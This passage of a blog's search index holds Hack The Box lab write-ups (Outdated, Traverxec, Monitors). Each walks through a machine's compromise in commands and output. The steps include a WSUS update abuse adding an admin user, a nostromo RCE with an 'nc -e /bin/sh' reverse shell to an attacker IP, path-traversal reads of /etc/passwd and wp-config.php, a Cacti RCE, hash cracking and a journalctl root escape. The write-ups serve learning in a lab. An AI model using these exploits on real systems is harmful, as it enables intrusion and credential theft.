/payload:'C:\\Windows\\Tasks\\PsExec64.exe' /args:'-accepteula -s -d cmd.exe /c \\\"net user 0xpthree Password123! /add && net localgroup Administrators 0xpthree /add && net localgroup Remote Management Users 0xpthree /add\"'\n\n[*] Action: Create Update\n[*] Creating patch to use the following:\n[*] Payload: PsExec64.exe\n[*] Payload Path: C:\\Windows\\Tasks\\PsExec64.exe\n[*] Arguments: -accepteula -s -d cmd.exe /c \"net user 0xpthree Password123! /add && net localgroup Administrators 0xpthree /add && net localgroup Remote Management Users 0xpthree /add\"\n[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c &amp;quot;net user 0xpthree Password123! /add &amp;amp;&amp;amp; net localgroup Administrators 0xpthree /add &amp;amp;&amp;amp; net localgroup Remote Management Users 0xpthree /add&amp;quot;\n\n################# WSUS Server Enumeration via SQL ##################\nServerName, WSUSPortNumber, WSUSContentLocation\n-----------------------------------------------\nDC, 8530, c:\\WSUS\\WsusContent\n\nImportUpdate\nUpdate Revision ID: 54\nPrepareXMLtoClient\nInjectURL2Download\nDeploymentRevision\nPrepareBundle\nPrepareBundle Revision ID: 55\nPrepareXMLBundletoClient\nDeploymentRevision\n\n[*] Update created - When ready to deploy use the following command:\n[*] SharpWSUS.exe approve /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN /groupname:\"Group Name\"\n\n[*] To check on the update status use the following command:\n[*] SharpWSUS.exe check /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN\n\n[*] To delete the update use the following command:\n[*] SharpWSUS.exe delete /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:Target.FQDN /groupname:\"Group Name\"\n\n[*] Create complete\n\n\n*Evil-WinRM* PS C:\\Windows\\Tasks&gt; ./SharpWSUS.exe approve /updateid:073f32f7-8d0d-431c-9f43-7758157fe39b /computername:dc.outdated.htb /groupname:\"Administrators\"\n\n[*] Action: Approve Update\n\nTargeting dc.outdated.htb\nTargetComputer, ComputerID, TargetID\n------------------------------------\ndc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1\nGroup Exists = False\nGroup Created: Administrators\nAdded Computer To Group\nApproved Update\n\n[*] Approve complete\n\n\n➜  outdated evil-winrm -i outdated.htb -u 0xpthree -p Password123!\n*Evil-WinRM* PS C:\\Users\\0xpthree\\Documents&gt; whoami\noutdated\\0xpthree\n\n*Evil-WinRM* PS C:\\Users\\0xpthree\\Documents&gt; whoami /groups\nGroup Name                                 Type             SID          Attributes\n========================================== ================ ============ ===============================================================\nEveryone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\nBUILTIN\\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level       Label            S-1-16-12288\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt\na6c2f6e1b2d05b537f337ba2f8209413"
  },
  {
    "objectID": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#references",
    "href": "posts/2022-08-22-htb-writeup-outdated/2022-08-22-htb-writeup-outdated.html#references",
    "title": "Outdated - Hack The Box",
    "section": "",
    "text": "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials\nhttps://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/\nhttps://labs.nettitude.com/blog/introducing-sharpwsus/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#wsus-deployment"
  },
  {
    "objectID": "posts/2019-11-18-htb-writeup-traverxec/2019-11-18-htb-writeup-traverxec.html",
    "href": "posts/2019-11-18-htb-writeup-traverxec/2019-11-18-htb-writeup-traverxec.html",
    "title": "Traverxec - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n ai.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nnmap -Pn -sV -n -p- traverxec.htb PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80/tcp open http nostromo 1.9.6 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nnmap -Pn -sV -n -sU traverxec.htb PORT STATE SERVICE VERSION 5353/udp open|filtered zeroconf\n\nEnum with Dirb and Nikto, also dirb -X .html for html-extension-files .. Server: nostromo 1.9.6\nGoogling nostromo 1.9.6 there is a known RCE vuln (CVE-2019-16278). Download the script and execute. root@p3:/opt/htb/machines/traverxec# ./cve-2019-16278.sh traverxec.htb 80 nc -e /bin/sh 10.10.14.10 4488\nroot@p3:/opt/shells# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.165] 57834 id uid=33(www-data) gid=33(www-data) groups=33(www-data)\nUpgrade the shell python -c ‘import pty;pty.spawn(“/bin/bash”)’ ctrl + z stty raw -echo fg   export TERM=xterm\nwww-data@traverxec:/home$ cd david/ www-data@traverxec:/home/david$ ls -al ls: cannot open directory ‘.’: Permission denied\nLooking for creds for David, start by looking at the webserver - /var/nostromo/conf/ www-data@traverxec:/var/nostromo/conf$ ls -al total 20 drwxr-xr-x 2 root daemon 4096 Oct 27 16:12 . drwxr-xr-x 6 root root 4096 Oct 25 14:43 .. -rw-r–r– 1 root bin 41 Oct 25 15:20 .htpasswd -rw-r–r– 1 root bin 2928 Oct 25 14:26 mimes -rw-r–r– 1 root bin 498 Oct 25 15:20 nhttpd.conf www-data@traverxec:/var/nostromo/conf$ cat .htpasswd david:\\(1\\)e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/\nThe password looks like a md5crypt (hash-mode 500), according to hashcat examples page.\nCrack the hash using hashcat. root@p3:/opt/htb/machines/traverxec# hashcat -a0 -m500 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt –force Session……….: hashcat Status………..: Cracked Hash.Type……..: md5crypt, MD5 (Unix), Cisco-IOS \\(1\\) (MD5) Hash.Target……: \\(1\\)e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ Time.Started…..: Mon Nov 18 10:41:10 2019 (6 secs) Time.Estimated…: Mon Nov 18 10:41:16 2019 (0 secs) Guess.Base…….: File (/usr/share/wordlists/rockyou.txt) Guess.Queue……: 1/1 (100.00%) Speed.#1………: 1778.3 kH/s (13.23ms) @ Accel:256 Loops:125 Thr:32 Vec:1 Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress………: 10911744/14344385 (76.07%) Rejected………: 0/10911744 (0.00%) Restore.Point….: 10616832/14344385 (74.01%) Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:875-1000 Candidates.#1….: Sabo2008 -&gt; LilHaiti1 Hardware.Mon.#1..: Temp: 56c Util: 67% Core:1635MHz Mem:6000MHz Bus:16 root@p3:/opt/htb/machines/traverxec# cat cracked.txt \\(1\\)e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me\nNOTE: Creds david:Nowonly4me\nThe creds above doesn’t seem to be usable anywhere, so looking further in the config-file we find that homedirs are set Browsing to http://traverxec.htb/~david/ gives us a landing page where we can’t do anything. This landing page is located as specified within the nostromo configuration file - /home/david/public_www.\nTrying to browse it locally however gives us another result.\nroot@p3:/opt/htb/machines/traverxec# nc -lvnp 4488\nwww-data@traverxec:/usr/bin$ export TERM=xterm www-data@traverxec:/usr/bin$ ls -alR /home/david/public_www/ /home/david/public_www/: total 16 drwxr-xr-x 3 david david 4096 Oct 25 15:45 . drwx–x–x 5 david david 4096 Oct 25 17:02 .. -rw-r–r– 1 david david 402 Oct 25 15:45 index.html drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area\n/home/david/public_www/protected-file-area: total 16 drwxr-xr-x 2 david david 4096 Oct 25 17:02 . drwxr-xr-x 3 david david 4096 Oct 25 15:45 .. -rw-r–r– 1 david david 45 Oct 25 15:46 .htaccess -rw-r–r– 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz www-data@traverxec:/usr/bin$\nExtract the .tgz to /dev/shm and recover the private SSH-key www-data@traverxec:/dev/shm$ tar -xvzf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub\nCopy id_rsa locally, change it to hash-format using sshng2john, and then crack it. root@p3:/usr/share/john# ./sshng2john.py /opt/htb/machines/traverxec/id_rsa &gt; /opt/htb/machines/traverxec/id_rsa.hash root@p3:/opt/htb/machines/traverxec# john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 12 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press ‘q’ or Ctrl-C to abort, almost any other key for status hunter (/opt/htb/machines/traverxec/id_rsa) 1g 0:00:00:01 DONE (2019-11-18 15:45) 0.5291g/s 7588Kp/s 7588Kc/s 7588KC/s 0125457423 ..*7¡Vamos! Session completed\nLogin with cracked creds (david:hunter) and grab user.txt root@p3:/opt/htb/machines/traverxec# ssh david@traverxec.htb -i id_rsa Enter passphrase for key ‘id_rsa’: Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64\ndavid@traverxec:~$ cat user.txt 7db0****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerating the homedir of david and we find a script for statistics and data collection, server-stats.sh. Looking through the code we can see that they execute a line as sudo /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat\nThe command journalctl is running as root, and it used with less - that is interactive. Running the command by ourselves gives us interaction, reading on gtfobins we can create a shell here by typing !/bin/sh\ndavid@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service – Logs begin at Tue 2019-11-19 06:23:10 EST, end at Tue 2019-11-19 07:53:45 EST. – Nov 19 07:09:13 traverxec sudo[2226]: pam_unix(sudo:auth): conversation failed Nov 19 07:09:13 traverxec sudo[2226]: pam_unix(sudo:auth): auth could not identify password for [www-data] Nov 19 07:09:13 traverxec sudo[2226]: www-data : command not allowed ; TTY=pts/3 ; PWD=/var/nostromo ; USER=root ; COMMAND=list Nov 19 07:18:33 traverxec su[2387]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/3 ruser=www-data rhost= Nov 19 07:18:36 traverxec su[2387]: FAILED SU (to bin) www-data on pts/3 !/bin/sh # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt 9aa3****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nJournalctl https://gtfobins.github.io/gtfobins/journalctl/"
  },
  {
    "objectID": "posts/2021-05-10-htb-writeup-monitors/2021-05-10-htb-writeup-monitors.html",
    "href": "posts/2021-05-10-htb-writeup-monitors/2021-05-10-htb-writeup-monitors.html",
    "title": "Monitors - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/monitors]# nmap -Pn -n -sCV –open 10.10.10.238 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA) | 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA) |_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn’t have a title (text/html; charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: —- Scanning URL: http://monitors.htb/ —- + http://monitors.htb/index.php (CODE:301|SIZE:0) + http://monitors.htb/server-status (CODE:403|SIZE:277) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/ ==&gt; DIRECTORY: http://monitors.htb/wp-includes/ + http://monitors.htb/xmlrpc.php (CODE:405|SIZE:42)\n—- Entering directory: http://monitors.htb/wp-admin/ —- + http://monitors.htb/wp-admin/admin.php (CODE:302|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/css/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/images/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/includes/ + http://monitors.htb/wp-admin/index.php (CODE:302|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-admin/js/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/maint/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/network/ ==&gt; DIRECTORY: http://monitors.htb/wp-admin/user/\n—- Entering directory: http://monitors.htb/wp-content/ —- + http://monitors.htb/wp-content/index.php (CODE:200|SIZE:0) ==&gt; DIRECTORY: http://monitors.htb/wp-content/languages/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/plugins/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/themes/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/upgrade/ ==&gt; DIRECTORY: http://monitors.htb/wp-content/uploads/\nNIKTO: + Apache/2.4.29\nhttp://10.10.10.238: + ‘If you are having issues accessing the site then contact the website administrator: admin@monitors.htb’\nhttp://monitors.htb + written by admin + Powered by Wordpress + Searchbox - check for input validation?\nWPSCAN: [+] XML-RPC seems to be enabled: http://monitors.htb/xmlrpc.php | Found By: Link Tag (Passive Detection) | Confidence: 100% | Confirmed By: Direct Access (Aggressive Detection), 100% confidence | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access\n[+] Upload directory has listing enabled: http://monitors.htb/wp-content/uploads/\n[+] The external WP-Cron seems to be enabled: http://monitors.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299\n[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).\n[+] WordPress theme in use: iconic-one | Location: http://monitors.htb/wp-content/themes/iconic-one/ | Last Updated: 2020-12-24T00:00:00.000Z | Readme: http://monitors.htb/wp-content/themes/iconic-one/readme.txt | [!] The version is out of date, the latest version is 2.1.9 | Style URL: http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8 | Style Name: Iconic One | Style URI: https://themonic.com/iconic-one/ | author: “0xPThree” description: Iconic One is a premium quality theme with pixel perfect typography and responsiveness and is built … | Author: Themonic | Author URI: https://themonic.com | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.1.7 (80% confidence) | Found By: Style (Passive Detection) | - http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8, Match: ‘Version: 2.1.7’\n[+] wp-with-spritz | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/ | Latest Version: 1.0 (up to date) | Last Updated: 2015-08-20T20:15:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | Version: 4.2.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt\nWORDPRESS ADMIN LOGIN: http://monitors.htb/wp-login.php\n\nGoogling on the plugin, wp spritz, there seem to be a LFI vulnerability. Download the python script and start enumerating the inside of the box. (Or simply use cURL)\n\n[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash Debian-snmp:x:112:115::/var/lib/snmp:/bin/false mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false\nInternal username is marcus.\nThe WordPress password storage for the login passwords is fairly secure. The passwords are encrypted and stored in the WordPress MySQL database. However, the password for the WordPress MySQL database itself is stored in the wp-config.php file in plain text.\n[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php .. define( ‘DB_NAME’, ‘wordpress’ );\n/** MySQL database username */ define( ‘DB_USER’, ‘wpadmin’ );\n/** MySQL database password */ define( ‘DB_PASSWORD’, ‘BestAdministrator@2020!’ );\n/**#@+ * Authentication Unique Keys and Salts.   Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.   @since 2.6.0 / define( ‘AUTH_KEY’, ‘KkY%W@&gt;T}4CKTw5{.n_j3bywoB0k|OKX0{}5|UqZ2!VH!uWKJ.O oROc,h pp:’ ); define( ‘SECURE_AUTH_KEY’, ’MHA-~&lt;-,^\\(raDR&uxP)k(~`k/{PRT(6JliOO9XnYYbFU?Xmb#9USEjmgeHYYpm' );\n  define( 'LOGGED_IN_KEY',    ')F6L,A23Tbr9yhrhbgjDHJPJe?sCsDzDow-\\)E?zYCZ3f40LSCIb] E%zrW@bs3/’ ); define( ‘NONCE_KEY’, ‘g?vl(p\\({jG`JvDxVw-]#oUyd+uvFRO1tAUZQG_sGg&Q7O-*tF[KIe\\)weE^$bB3%C’ ); define( ‘AUTH_SALT’, ‘8&gt;PIil3 7re_:3&@8Zh|pI8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b–/[Jk’ ); define( ’SECURE_AUTH_SALT’, ’dN c^]m:4O|GyOK50hQ1tumg4&lt;JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S&.hEGfv’ ); define( ‘LOGGED_IN_SALT’, ‘tCWVbTcET}X3#t+:)&gt;N+D%?vVAIw#!&OK78M[@ YT0q):G~A:hTvbO&lt;,|68' );   define( 'NONCE_SALT',       'sa&gt;i39)9&lt;vVyhE3auBVzl%=p23NJbl&)*.{&lt;*&gt;;R2=QHqj_a.%({D4yI-sy]D8,’ );\n/**#@-*/\nWe have database creds (wpadmin:BestAdministrator@2020!) and keys+salts used for hashing the passwords. The password is not reused on either wp-admin nor SSH.\nAfter unsuccessfully testing out different RFI payloads for a while I had a look in ‘/etc/php/7.2/apache2/php.ini’ and noticed that ‘allow_url_fopen = On’ but ‘allow_url_include = Off’ - making RFI impossible.\nDownload HackTrick’s LFI-list, and do a Hail Marry with Burp Intruder, sort by Length and we come across:\n/etc/apache2/sites-enabled/000-default.conf # Default virtual host settings # Add monitors.htb.conf # Add cacti-admin.monitors.htb.conf\nA new vhost! Add it to /etc/hosts.\n\nOn http://cacti-admin.monitors.htb we are presented with a login prompt, testing the creds admin:BestAdministrator@2020! give us successful login. We see that it’s running Cacti version 1.2.12.\n\nGoogling for Cacti 1.2.12 exploits we find a python RCE. Downloading it and execute gives us a reverse shell!\n[root:/git/htb/monitors]# python3 cacti-rce.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! –lhost 10.10.14.12 –lport 4488 [+] Connecting to the server… [+] Retrieving CSRF token… [+] Got CSRF token: sid:97352a3ee6f8c68e07088e88d2e75ed5df8bc588,1620638867 [+] Trying to log in… [+] Successfully logged in!\n[+] SQL Injection:\n\"name\",\"hex\"\n\"\",\"\"\n\"admin\",\"$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK\"\n\"guest\",\"43e9a4ab75570f5b\"\n\n[+] Check your nc listener!\n[root:/git/htb/monitors]# nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.12] from (UNKNOWN) [10.10.10.238] 38356 /bin/sh: 0: can’t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)\nUpgrade the shell; www-data@monitors:/usr/share/cacti/cacti$\n\nWe can try to dump the mysql database for WordPress, in order to crack the admin password.\n\nwww-data@monitors:/usr/share/cacti/cacti$ mysqldump wordpress wp_users -u wpadmin -p Enter password: BestAdministrator@2020! .. LOCK TABLES wp_users WRITE; /!40000 ALTER TABLE wp_users DISABLE KEYS /; INSERT INTO wp_users VALUES (1,‘admin’,‘\\(P\\)Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0’,‘admin’,‘admin@monitor.htb’,‘http://192.168.1.40’,‘2020-10-15 13:45:42’,‘1620579357:\\(P\\)BPWRkUQGNxbjdPxyenG7IVioT6ri7t.’,0,‘admin’);\n[root:/git/htb/monitors]# hashcat -a0 -m400 admin.hash /usr/share/wordlists/rockyou.txt .. Session……….: hashcat Status………..: Exhausted Hash.Name……..: phpass Hash.Target……: \\(P\\)Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0\nNo luck.. instead go the normal route and upload linpeas.\nListener: www-data@monitors:/dev/shm$ nc -lp 4433 &gt; linpeas.sh Transfer: [root:/opt/scanners/linux]# nc -w3 10.10.10.238 4433 &lt; linpeas.sh\nRunning linpeas doesn’t give anything of real use however.. Moving on and manually looking in /home/marcus we see the directory .backup, but we lack privs to see what’s in it.\nwww-data@monitors:/home/marcus$ ls -al total 40 drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 . drwxr-xr-x 3 root root 4096 Nov 10 17:00 .. d–x–x–x 2 marcus marcus 4096 Nov 10 18:21 .backup lrwxrwxrwx 1 root root 9 Nov 10 18:30 .bash_history -&gt; /dev/null -rw-r–r– 1 marcus marcus 220 Apr 4 2018 .bash_logout -rw-r–r– 1 marcus marcus 3771 Apr 4 2018 .bashrc drwx—— 2 marcus marcus 4096 Jan 25 15:39 .cache drwx—— 3 marcus marcus 4096 Nov 10 17:00 .gnupg -rw-r–r– 1 marcus marcus 807 Apr 4 2018 .profile -r–r—– 1 root marcus 84 Jan 25 14:59 note.txt -r–r—– 1 root marcus 33 May 9 15:30 user.txt\nWe can search the entire system to see if there are any file or service that have an absolute path to ‘/home/marcus/.backup’ NOTE: This is very unoptimized and will take several minutes.\nwww-data@monitors:/$ grep -Ril “/home/marcus/.backup” 2&gt; /dev/null /etc/systemd/system/cacti-backup.service\nwww-data@monitors:/$ cat /etc/systemd/system/cacti-backup.service [Unit] Description=Cacti Backup Service After=network.target\n[Service]\nType=oneshot\nUser=www-data\nExecStart=/home/marcus/.backup/backup.sh\n\n[Install]\nWantedBy=multi-user.target\nLets try if we can read the file backup.sh: www-data@monitors:/$ cat /home/marcus/.backup/backup.sh #!/bin/bash\nbackup_name=\"cacti_backup\"\nconfig_pass=\"VerticalEdge2020\"\n\nzip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*\nsshpass -p \"${config_pass}\" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip\nrm /tmp/${backup_name}.zip\nA new set of creds! cacti_backup:VerticalEdge2020 - lets try if user marcus use the same password.\nwww-data@monitors:/$ su marcus Password: VerticalEdge2020 marcus@monitors:/$ id uid=1000(marcus) gid=1000(marcus) groups=1000(marcus) marcus@monitors:/$ cat /home/marcus/user.txt 20914feda0c2c461a15461b4a650c321\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nWe saw earlier note.txt in marcus home 